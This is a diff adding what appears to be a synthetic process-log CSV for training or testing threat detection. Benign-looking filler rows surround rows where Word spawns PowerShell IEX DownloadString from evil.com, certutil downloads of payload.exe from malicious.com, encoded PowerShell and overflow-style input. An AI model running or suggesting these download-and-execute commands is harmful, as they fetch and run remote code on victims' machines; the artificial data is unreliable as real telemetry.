@@ -1,0 +1,1017 @@
+timestamp,process,parent_process,command_line,ip,destination_port,user_agent
+2026-03-30 18:07:45,powershell.exe,winword.exe,powershell -enc aW52b2tl,8.8.8.8,4444,curl
+2026-03-30 18:07:46,powershell.exe,winword.exe,powershell -enc aW52b2tl,45.33.32.156,4444,python-requests
+2026-03-30 18:07:47,powershell.exe,winword.exe,powershell -enc aW52b2tl,1.1.1.1,4444,curl
+2026-03-30 18:07:48,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,4444,python-requests
+2026-03-30 18:07:49,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),45.33.32.156,443,curl
+2026-03-30 18:07:50,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:07:51,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:07:52,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:07:53,chrome.exe,explorer.exe,explorer open folder,192.168.1.72,0,chrome
+2026-03-30 18:07:54,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.91,0,chrome
+2026-03-30 18:07:55,notepad.exe,explorer.exe,cmd dir,192.168.1.70,0,chrome
+2026-03-30 18:07:56,notepad.exe,explorer.exe,explorer open folder,192.168.1.103,0,chrome
+2026-03-30 18:07:57,cmd.exe,explorer.exe,cmd dir,192.168.1.77,0,chrome
+2026-03-30 18:07:58,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.179,0,chrome
+2026-03-30 18:07:59,cmd.exe,explorer.exe,explorer open folder,192.168.1.178,0,chrome
+2026-03-30 18:08:00,cmd.exe,explorer.exe,cmd dir,192.168.1.235,0,chrome
+2026-03-30 18:08:01,explorer.exe,explorer.exe,explorer open folder,192.168.1.214,0,chrome
+2026-03-30 18:08:02,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.61,0,chrome
+2026-03-30 18:08:03,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.176,0,chrome
+2026-03-30 18:08:04,explorer.exe,explorer.exe,cmd dir,192.168.1.169,0,chrome
+2026-03-30 18:08:05,cmd.exe,explorer.exe,notepad file.txt,192.168.1.138,0,chrome
+2026-03-30 18:08:06,cmd.exe,explorer.exe,cmd dir,192.168.1.219,0,chrome
+2026-03-30 18:08:07,explorer.exe,explorer.exe,notepad file.txt,192.168.1.194,0,chrome
+2026-03-30 18:08:08,chrome.exe,explorer.exe,explorer open folder,192.168.1.139,0,chrome
+2026-03-30 18:08:09,explorer.exe,explorer.exe,notepad file.txt,192.168.1.133,0,chrome
+2026-03-30 18:08:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.196,0,chrome
+2026-03-30 18:08:11,cmd.exe,explorer.exe,notepad file.txt,192.168.1.91,0,chrome
+2026-03-30 18:08:12,explorer.exe,explorer.exe,explorer open folder,192.168.1.126,0,chrome
+2026-03-30 18:08:13,notepad.exe,explorer.exe,notepad file.txt,192.168.1.89,0,chrome
+2026-03-30 18:08:14,notepad.exe,explorer.exe,notepad file.txt,192.168.1.250,0,chrome
+2026-03-30 18:08:15,explorer.exe,explorer.exe,cmd dir,192.168.1.13,0,chrome
+2026-03-30 18:08:16,notepad.exe,explorer.exe,cmd dir,192.168.1.43,0,chrome
+2026-03-30 18:08:17,cmd.exe,explorer.exe,notepad file.txt,192.168.1.73,0,chrome
+2026-03-30 18:08:18,cmd.exe,explorer.exe,explorer open folder,192.168.1.22,0,chrome
+2026-03-30 18:08:19,chrome.exe,explorer.exe,notepad file.txt,192.168.1.184,0,chrome
+2026-03-30 18:08:20,chrome.exe,explorer.exe,explorer open folder,192.168.1.223,0,chrome
+2026-03-30 18:08:21,explorer.exe,explorer.exe,cmd dir,192.168.1.36,0,chrome
+2026-03-30 18:08:22,cmd.exe,explorer.exe,explorer open folder,192.168.1.93,0,chrome
+2026-03-30 18:08:23,notepad.exe,explorer.exe,notepad file.txt,192.168.1.106,0,chrome
+2026-03-30 18:08:24,explorer.exe,explorer.exe,notepad file.txt,192.168.1.211,0,chrome
+2026-03-30 18:08:25,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.243,0,chrome
+2026-03-30 18:08:26,explorer.exe,explorer.exe,notepad file.txt,192.168.1.195,0,chrome
+2026-03-30 18:08:27,chrome.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
+2026-03-30 18:08:28,notepad.exe,explorer.exe,explorer open folder,192.168.1.108,0,chrome
+2026-03-30 18:08:29,cmd.exe,explorer.exe,notepad file.txt,192.168.1.146,0,chrome
+2026-03-30 18:08:30,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.218,0,chrome
+2026-03-30 18:08:31,explorer.exe,explorer.exe,cmd dir,192.168.1.30,0,chrome
+2026-03-30 18:08:32,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.240,0,chrome
+2026-03-30 18:08:33,notepad.exe,explorer.exe,explorer open folder,192.168.1.151,0,chrome
+2026-03-30 18:08:34,cmd.exe,explorer.exe,cmd dir,192.168.1.73,0,chrome
+2026-03-30 18:08:35,explorer.exe,explorer.exe,cmd dir,192.168.1.118,0,chrome
+2026-03-30 18:08:36,cmd.exe,explorer.exe,notepad file.txt,192.168.1.22,0,chrome
+2026-03-30 18:08:37,chrome.exe,explorer.exe,notepad file.txt,192.168.1.253,0,chrome
+2026-03-30 18:08:38,chrome.exe,explorer.exe,notepad file.txt,192.168.1.110,0,chrome
+2026-03-30 18:08:39,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.126,0,chrome
+2026-03-30 18:08:40,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.233,0,chrome
+2026-03-30 18:08:41,explorer.exe,explorer.exe,explorer open folder,192.168.1.174,0,chrome
+2026-03-30 18:08:42,chrome.exe,explorer.exe,cmd dir,192.168.1.239,0,chrome
+2026-03-30 18:08:43,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.58,0,chrome
+2026-03-30 18:08:44,chrome.exe,explorer.exe,cmd dir,192.168.1.31,0,chrome
+2026-03-30 18:08:45,notepad.exe,explorer.exe,notepad file.txt,192.168.1.154,0,chrome
+2026-03-30 18:08:46,cmd.exe,explorer.exe,explorer open folder,192.168.1.243,0,chrome
+2026-03-30 18:08:47,chrome.exe,explorer.exe,explorer open folder,192.168.1.54,0,chrome
+2026-03-30 18:08:48,notepad.exe,explorer.exe,explorer open folder,192.168.1.49,0,chrome
+2026-03-30 18:08:49,notepad.exe,explorer.exe,cmd dir,192.168.1.122,0,chrome
+2026-03-30 18:08:50,explorer.exe,explorer.exe,explorer open folder,192.168.1.160,0,chrome
+2026-03-30 18:08:51,explorer.exe,explorer.exe,explorer open folder,192.168.1.235,0,chrome
+2026-03-30 18:08:52,explorer.exe,explorer.exe,cmd dir,192.168.1.174,0,chrome
+2026-03-30 18:08:53,chrome.exe,explorer.exe,cmd dir,192.168.1.237,0,chrome
+2026-03-30 18:08:54,explorer.exe,explorer.exe,notepad file.txt,192.168.1.115,0,chrome
+2026-03-30 18:08:55,explorer.exe,explorer.exe,notepad file.txt,192.168.1.6,0,chrome
+2026-03-30 18:08:56,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.199,0,chrome
+2026-03-30 18:08:57,explorer.exe,explorer.exe,explorer open folder,192.168.1.173,0,chrome
+2026-03-30 18:08:58,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.218,0,chrome
+2026-03-30 18:08:59,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.140,0,chrome
+2026-03-30 18:09:00,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.170,0,chrome
+2026-03-30 18:09:01,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.42,0,chrome
+2026-03-30 18:09:02,cmd.exe,explorer.exe,notepad file.txt,192.168.1.234,0,chrome
+2026-03-30 18:09:03,explorer.exe,explorer.exe,explorer open folder,192.168.1.35,0,chrome
+2026-03-30 18:09:04,notepad.exe,explorer.exe,notepad file.txt,192.168.1.234,0,chrome
+2026-03-30 18:09:05,chrome.exe,explorer.exe,cmd dir,192.168.1.222,0,chrome
+2026-03-30 18:09:06,notepad.exe,explorer.exe,cmd dir,192.168.1.78,0,chrome
+2026-03-30 18:09:07,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.156,0,chrome
+2026-03-30 18:09:08,cmd.exe,explorer.exe,notepad file.txt,192.168.1.224,0,chrome
+2026-03-30 18:09:09,notepad.exe,explorer.exe,cmd dir,192.168.1.137,0,chrome
+2026-03-30 18:09:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.47,0,chrome
+2026-03-30 18:09:11,explorer.exe,explorer.exe,cmd dir,192.168.1.154,0,chrome
+2026-03-30 18:09:12,cmd.exe,explorer.exe,cmd dir,192.168.1.71,0,chrome
+2026-03-30 18:09:13,explorer.exe,explorer.exe,cmd dir,192.168.1.25,0,chrome
+2026-03-30 18:09:14,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.174,0,chrome
+2026-03-30 18:09:15,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.186,0,chrome
+2026-03-30 18:09:16,explorer.exe,explorer.exe,cmd dir,192.168.1.213,0,chrome
+2026-03-30 18:09:17,explorer.exe,explorer.exe,notepad file.txt,192.168.1.17,0,chrome
+2026-03-30 18:09:18,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.157,0,chrome
+2026-03-30 18:09:19,notepad.exe,explorer.exe,explorer open folder,192.168.1.242,0,chrome
+2026-03-30 18:09:20,cmd.exe,explorer.exe,cmd dir,192.168.1.104,0,chrome
+2026-03-30 18:09:21,notepad.exe,explorer.exe,explorer open folder,192.168.1.10,0,chrome
+2026-03-30 18:09:22,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.179,0,chrome
+2026-03-30 18:09:23,cmd.exe,explorer.exe,explorer open folder,192.168.1.87,0,chrome
+2026-03-30 18:09:24,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.239,0,chrome
+2026-03-30 18:09:25,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,1.1.1.1,80,python-requests
+2026-03-30 18:09:26,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,80,python-requests
+2026-03-30 18:09:27,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,45.33.32.156,80,curl
+2026-03-30 18:09:28,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,443,python-requests
+2026-03-30 18:09:29,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),23.45.67.89,80,curl
+2026-03-30 18:09:30,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:09:31,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
+2026-03-30 18:09:32,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:09:33,chrome.exe,explorer.exe,notepad file.txt,192.168.1.228,0,chrome
+2026-03-30 18:09:34,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.142,0,chrome
+2026-03-30 18:09:35,cmd.exe,explorer.exe,notepad file.txt,192.168.1.255,0,chrome
+2026-03-30 18:09:36,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.138,0,chrome
+2026-03-30 18:09:37,explorer.exe,explorer.exe,cmd dir,192.168.1.51,0,chrome
+2026-03-30 18:09:38,explorer.exe,explorer.exe,notepad file.txt,192.168.1.223,0,chrome
+2026-03-30 18:09:39,notepad.exe,explorer.exe,cmd dir,192.168.1.133,0,chrome
+2026-03-30 18:09:40,cmd.exe,explorer.exe,notepad file.txt,192.168.1.246,0,chrome
+2026-03-30 18:09:41,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.241,0,chrome
+2026-03-30 18:09:42,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.1,0,chrome
+2026-03-30 18:09:43,chrome.exe,explorer.exe,notepad file.txt,192.168.1.194,0,chrome
+2026-03-30 18:09:44,cmd.exe,explorer.exe,cmd dir,192.168.1.20,0,chrome
+2026-03-30 18:09:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,8.8.8.8,8080,curl
+2026-03-30 18:09:46,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.148,0,chrome
+2026-03-30 18:09:47,cmd.exe,explorer.exe,explorer open folder,192.168.1.92,0,chrome
+2026-03-30 18:09:48,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.139,0,chrome
+2026-03-30 18:09:49,notepad.exe,explorer.exe,notepad file.txt,192.168.1.38,0,chrome
+2026-03-30 18:09:50,explorer.exe,explorer.exe,notepad file.txt,192.168.1.147,0,chrome
+2026-03-30 18:09:51,chrome.exe,explorer.exe,explorer open folder,192.168.1.1,0,chrome
+2026-03-30 18:09:52,chrome.exe,explorer.exe,cmd dir,192.168.1.178,0,chrome
+2026-03-30 18:09:53,explorer.exe,explorer.exe,explorer open folder,192.168.1.25,0,chrome
+2026-03-30 18:09:54,cmd.exe,explorer.exe,notepad file.txt,192.168.1.52,0,chrome
+2026-03-30 18:09:55,explorer.exe,explorer.exe,explorer open folder,192.168.1.136,0,chrome
+2026-03-30 18:09:56,cmd.exe,explorer.exe,notepad file.txt,192.168.1.176,0,chrome
+2026-03-30 18:09:57,cmd.exe,explorer.exe,explorer open folder,192.168.1.83,0,chrome
+2026-03-30 18:09:58,cmd.exe,explorer.exe,cmd dir,192.168.1.189,0,chrome
+2026-03-30 18:09:59,chrome.exe,explorer.exe,cmd dir,192.168.1.96,0,chrome
+2026-03-30 18:10:00,notepad.exe,explorer.exe,notepad file.txt,192.168.1.36,0,chrome
+2026-03-30 18:10:01,cmd.exe,explorer.exe,cmd dir,192.168.1.211,0,chrome
+2026-03-30 18:10:02,cmd.exe,explorer.exe,cmd dir,192.168.1.224,0,chrome
+2026-03-30 18:10:03,cmd.exe,explorer.exe,explorer open folder,192.168.1.48,0,chrome
+2026-03-30 18:10:04,chrome.exe,explorer.exe,notepad file.txt,192.168.1.18,0,chrome
+2026-03-30 18:10:05,notepad.exe,explorer.exe,explorer open folder,192.168.1.124,0,chrome
+2026-03-30 18:10:06,chrome.exe,explorer.exe,notepad file.txt,192.168.1.221,0,chrome
+2026-03-30 18:10:07,explorer.exe,explorer.exe,cmd dir,192.168.1.217,0,chrome
+2026-03-30 18:10:08,cmd.exe,explorer.exe,explorer open folder,192.168.1.92,0,chrome
+2026-03-30 18:10:09,cmd.exe,explorer.exe,explorer open folder,192.168.1.222,0,chrome
+2026-03-30 18:10:10,chrome.exe,explorer.exe,cmd dir,192.168.1.191,0,chrome
+2026-03-30 18:10:11,chrome.exe,explorer.exe,notepad file.txt,192.168.1.39,0,chrome
+2026-03-30 18:10:12,chrome.exe,explorer.exe,notepad file.txt,192.168.1.106,0,chrome
+2026-03-30 18:10:13,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.225,0,chrome
+2026-03-30 18:10:14,notepad.exe,explorer.exe,cmd dir,192.168.1.255,0,chrome
+2026-03-30 18:10:15,unknown_433.exe,explorer.exe,random suspicious execution,45.33.32.156,9999,unknown
+2026-03-30 18:10:16,notepad.exe,explorer.exe,notepad file.txt,192.168.1.140,0,chrome
+2026-03-30 18:10:17,notepad.exe,explorer.exe,explorer open folder,192.168.1.125,0,chrome
+2026-03-30 18:10:18,notepad.exe,explorer.exe,notepad file.txt,192.168.1.246,0,chrome
+2026-03-30 18:10:19,notepad.exe,explorer.exe,cmd dir,192.168.1.94,0,chrome
+2026-03-30 18:10:20,chrome.exe,explorer.exe,notepad file.txt,192.168.1.227,0,chrome
+2026-03-30 18:10:21,notepad.exe,explorer.exe,cmd dir,192.168.1.132,0,chrome
+2026-03-30 18:10:22,explorer.exe,explorer.exe,cmd dir,192.168.1.164,0,chrome
+2026-03-30 18:10:23,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.214,0,chrome
+2026-03-30 18:10:24,notepad.exe,explorer.exe,notepad file.txt,192.168.1.143,0,chrome
+2026-03-30 18:10:25,chrome.exe,explorer.exe,cmd dir,192.168.1.186,0,chrome
+2026-03-30 18:10:26,cmd.exe,explorer.exe,cmd dir,192.168.1.124,0,chrome
+2026-03-30 18:10:27,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.250,0,chrome
+2026-03-30 18:10:28,explorer.exe,explorer.exe,notepad file.txt,192.168.1.1,0,chrome
+2026-03-30 18:10:29,cmd.exe,explorer.exe,cmd dir,192.168.1.115,0,chrome
+2026-03-30 18:10:30,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.31,0,chrome
+2026-03-30 18:10:31,cmd.exe,explorer.exe,cmd dir,192.168.1.7,0,chrome
+2026-03-30 18:10:32,explorer.exe,explorer.exe,notepad file.txt,192.168.1.222,0,chrome
+2026-03-30 18:10:33,cmd.exe,explorer.exe,cmd dir,192.168.1.177,0,chrome
+2026-03-30 18:10:34,chrome.exe,explorer.exe,cmd dir,192.168.1.144,0,chrome
+2026-03-30 18:10:35,cmd.exe,explorer.exe,explorer open folder,192.168.1.89,0,chrome
+2026-03-30 18:10:36,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.34,0,chrome
+2026-03-30 18:10:37,cmd.exe,explorer.exe,cmd dir,192.168.1.40,0,chrome
+2026-03-30 18:10:38,cmd.exe,explorer.exe,explorer open folder,192.168.1.28,0,chrome
+2026-03-30 18:10:39,chrome.exe,explorer.exe,notepad file.txt,192.168.1.121,0,chrome
+2026-03-30 18:10:40,chrome.exe,explorer.exe,notepad file.txt,192.168.1.128,0,chrome
+2026-03-30 18:10:41,cmd.exe,explorer.exe,notepad file.txt,192.168.1.146,0,chrome
+2026-03-30 18:10:42,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.30,0,chrome
+2026-03-30 18:10:43,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.127,0,chrome
+2026-03-30 18:10:44,cmd.exe,explorer.exe,cmd dir,192.168.1.58,0,chrome
+2026-03-30 18:10:45,explorer.exe,explorer.exe,explorer open folder,192.168.1.216,0,chrome
+2026-03-30 18:10:46,explorer.exe,explorer.exe,notepad file.txt,192.168.1.199,0,chrome
+2026-03-30 18:10:47,cmd.exe,explorer.exe,explorer open folder,192.168.1.180,0,chrome
+2026-03-30 18:10:48,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.107,0,chrome
+2026-03-30 18:10:49,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.103,0,chrome
+2026-03-30 18:10:50,chrome.exe,explorer.exe,notepad file.txt,192.168.1.34,0,chrome
+2026-03-30 18:10:51,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.18,0,chrome
+2026-03-30 18:10:52,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.148,0,chrome
+2026-03-30 18:10:53,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.250,0,chrome
+2026-03-30 18:10:54,cmd.exe,explorer.exe,cmd dir,192.168.1.173,0,chrome
+2026-03-30 18:10:55,chrome.exe,explorer.exe,notepad file.txt,192.168.1.155,0,chrome
+2026-03-30 18:10:56,chrome.exe,explorer.exe,cmd dir,192.168.1.182,0,chrome
+2026-03-30 18:10:57,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.178,0,chrome
+2026-03-30 18:10:58,notepad.exe,explorer.exe,notepad file.txt,192.168.1.74,0,chrome
+2026-03-30 18:10:59,chrome.exe,explorer.exe,cmd dir,192.168.1.70,0,chrome
+2026-03-30 18:11:00,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.115,0,chrome
+2026-03-30 18:11:01,cmd.exe,explorer.exe,explorer open folder,192.168.1.135,0,chrome
+2026-03-30 18:11:02,explorer.exe,explorer.exe,notepad file.txt,192.168.1.117,0,chrome
+2026-03-30 18:11:03,notepad.exe,explorer.exe,explorer open folder,192.168.1.30,0,chrome
+2026-03-30 18:11:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.76,0,chrome
+2026-03-30 18:11:05,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),45.33.32.156,443,python-requests
+2026-03-30 18:11:06,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,curl
+2026-03-30 18:11:07,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,45.33.32.156,443,python-requests
+2026-03-30 18:11:08,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,4444,curl
+2026-03-30 18:11:09,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,80,curl
+2026-03-30 18:11:10,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:11:11,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:11:12,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:11:13,notepad.exe,explorer.exe,explorer open folder,192.168.1.154,0,chrome
+2026-03-30 18:11:14,cmd.exe,explorer.exe,explorer open folder,192.168.1.184,0,chrome
+2026-03-30 18:11:15,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.235,0,chrome
+2026-03-30 18:11:16,explorer.exe,explorer.exe,explorer open folder,192.168.1.119,0,chrome
+2026-03-30 18:11:17,chrome.exe,explorer.exe,notepad file.txt,192.168.1.85,0,chrome
+2026-03-30 18:11:18,notepad.exe,explorer.exe,explorer open folder,192.168.1.76,0,chrome
+2026-03-30 18:11:19,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.217,0,chrome
+2026-03-30 18:11:20,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.206,0,chrome
+2026-03-30 18:11:21,notepad.exe,explorer.exe,explorer open folder,192.168.1.148,0,chrome
+2026-03-30 18:11:22,notepad.exe,explorer.exe,explorer open folder,192.168.1.244,0,chrome
+2026-03-30 18:11:23,notepad.exe,explorer.exe,cmd dir,192.168.1.181,0,chrome
+2026-03-30 18:11:24,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.246,0,chrome
+2026-03-30 18:11:25,explorer.exe,explorer.exe,notepad file.txt,192.168.1.165,0,chrome
+2026-03-30 18:11:26,cmd.exe,explorer.exe,explorer open folder,192.168.1.106,0,chrome
+2026-03-30 18:11:27,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.199,0,chrome
+2026-03-30 18:11:28,chrome.exe,explorer.exe,cmd dir,192.168.1.141,0,chrome
+2026-03-30 18:11:29,explorer.exe,explorer.exe,notepad file.txt,192.168.1.208,0,chrome
+2026-03-30 18:11:30,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.21,0,chrome
+2026-03-30 18:11:31,notepad.exe,explorer.exe,cmd dir,192.168.1.107,0,chrome
+2026-03-30 18:11:32,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.235,0,chrome
+2026-03-30 18:11:33,cmd.exe,explorer.exe,notepad file.txt,192.168.1.82,0,chrome
+2026-03-30 18:11:34,cmd.exe,explorer.exe,cmd dir,192.168.1.251,0,chrome
+2026-03-30 18:11:35,cmd.exe,explorer.exe,notepad file.txt,192.168.1.245,0,chrome
+2026-03-30 18:11:36,chrome.exe,explorer.exe,cmd dir,192.168.1.63,0,chrome
+2026-03-30 18:11:37,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.9,0,chrome
+2026-03-30 18:11:38,explorer.exe,explorer.exe,notepad file.txt,192.168.1.217,0,chrome
+2026-03-30 18:11:39,chrome.exe,explorer.exe,cmd dir,192.168.1.227,0,chrome
+2026-03-30 18:11:40,notepad.exe,explorer.exe,cmd dir,192.168.1.112,0,chrome
+2026-03-30 18:11:41,explorer.exe,explorer.exe,cmd dir,192.168.1.93,0,chrome
+2026-03-30 18:11:42,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.206,0,chrome
+2026-03-30 18:11:43,notepad.exe,explorer.exe,notepad file.txt,192.168.1.28,0,chrome
+2026-03-30 18:11:44,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.104,0,chrome
+2026-03-30 18:11:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,8.8.8.8,8080,curl
+2026-03-30 18:11:46,notepad.exe,explorer.exe,explorer open folder,192.168.1.180,0,chrome
+2026-03-30 18:11:47,notepad.exe,explorer.exe,notepad file.txt,192.168.1.78,0,chrome
+2026-03-30 18:11:48,chrome.exe,explorer.exe,explorer open folder,192.168.1.75,0,chrome
+2026-03-30 18:11:49,chrome.exe,explorer.exe,explorer open folder,192.168.1.219,0,chrome
+2026-03-30 18:11:50,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.182,0,chrome
+2026-03-30 18:11:51,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.17,0,chrome
+2026-03-30 18:11:52,chrome.exe,explorer.exe,notepad file.txt,192.168.1.206,0,chrome
+2026-03-30 18:11:53,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.101,0,chrome
+2026-03-30 18:11:54,explorer.exe,explorer.exe,notepad file.txt,192.168.1.117,0,chrome
+2026-03-30 18:11:55,cmd.exe,explorer.exe,explorer open folder,192.168.1.215,0,chrome
+2026-03-30 18:11:56,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.9,0,chrome
+2026-03-30 18:11:57,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.78,0,chrome
+2026-03-30 18:11:58,chrome.exe,explorer.exe,notepad file.txt,192.168.1.74,0,chrome
+2026-03-30 18:11:59,explorer.exe,explorer.exe,cmd dir,192.168.1.115,0,chrome
+2026-03-30 18:12:00,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.138,0,chrome
+2026-03-30 18:12:01,cmd.exe,explorer.exe,cmd dir,192.168.1.72,0,chrome
+2026-03-30 18:12:02,explorer.exe,explorer.exe,explorer open folder,192.168.1.201,0,chrome
+2026-03-30 18:12:03,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.37,0,chrome
+2026-03-30 18:12:04,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.208,0,chrome
+2026-03-30 18:12:05,cmd.exe,explorer.exe,explorer open folder,192.168.1.219,0,chrome
+2026-03-30 18:12:06,chrome.exe,explorer.exe,notepad file.txt,192.168.1.85,0,chrome
+2026-03-30 18:12:07,chrome.exe,explorer.exe,cmd dir,192.168.1.170,0,chrome
+2026-03-30 18:12:08,chrome.exe,explorer.exe,notepad file.txt,192.168.1.216,0,chrome
+2026-03-30 18:12:09,chrome.exe,explorer.exe,explorer open folder,192.168.1.159,0,chrome
+2026-03-30 18:12:10,notepad.exe,explorer.exe,cmd dir,192.168.1.46,0,chrome
+2026-03-30 18:12:11,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.19,0,chrome
+2026-03-30 18:12:12,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.233,0,chrome
+2026-03-30 18:12:13,chrome.exe,explorer.exe,notepad file.txt,192.168.1.142,0,chrome
+2026-03-30 18:12:14,cmd.exe,explorer.exe,cmd dir,192.168.1.57,0,chrome
+2026-03-30 18:12:15,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.15,0,chrome
+2026-03-30 18:12:16,notepad.exe,explorer.exe,notepad file.txt,192.168.1.97,0,chrome
+2026-03-30 18:12:17,explorer.exe,explorer.exe,explorer open folder,192.168.1.169,0,chrome
+2026-03-30 18:12:18,explorer.exe,explorer.exe,explorer open folder,192.168.1.241,0,chrome
+2026-03-30 18:12:19,chrome.exe,explorer.exe,notepad file.txt,192.168.1.250,0,chrome
+2026-03-30 18:12:20,notepad.exe,explorer.exe,explorer open folder,192.168.1.128,0,chrome
+2026-03-30 18:12:21,explorer.exe,explorer.exe,notepad file.txt,192.168.1.73,0,chrome
+2026-03-30 18:12:22,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.57,0,chrome
+2026-03-30 18:12:23,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.152,0,chrome
+2026-03-30 18:12:24,cmd.exe,explorer.exe,cmd dir,192.168.1.39,0,chrome
+2026-03-30 18:12:25,cmd.exe,explorer.exe,cmd dir,192.168.1.68,0,chrome
